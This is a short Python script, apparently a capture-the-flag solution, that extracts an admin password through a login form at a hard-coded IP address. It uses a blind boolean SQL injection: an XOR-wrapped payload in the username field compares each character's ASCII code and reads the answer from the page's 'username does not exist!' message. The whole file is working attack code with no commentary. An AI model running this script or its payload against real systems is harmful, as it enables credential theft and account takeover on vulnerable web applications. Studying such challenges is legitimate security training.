#!/usr/bin/env python
import requests,string,hashlib,re
url='http://47.93.190.246:49167/'
sss=string.digits+string.lowercase
headers={
    'Host': '47.93.190.246:49167',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://47.93.190.246:49167/',
    'Cookie': 'PHPSESSID=3mrk7ekrf870mmdnpjkfjpgvs0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '27',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests':'1'
}
answer=''
for i in range(1,50):
    flag=0
    for j in sss:
        postuser="'^(select(ascii(mid((select(password)from(admin))from(%d)))<>%d))^1#"%(i,ord(j))
        data = {'username':postuser,'password':'admin'}
        html = requests.post(url,headers=headers,data=data) .text
        html = re.findall(r"<p align='center'>(.*?)</p>",html,re.S)[0]
        if 'username does not exist!' in html :
            answer+=j
            flag=1
            print answer
            break
    if flag ==0 :
        break

print 'password is ',answer
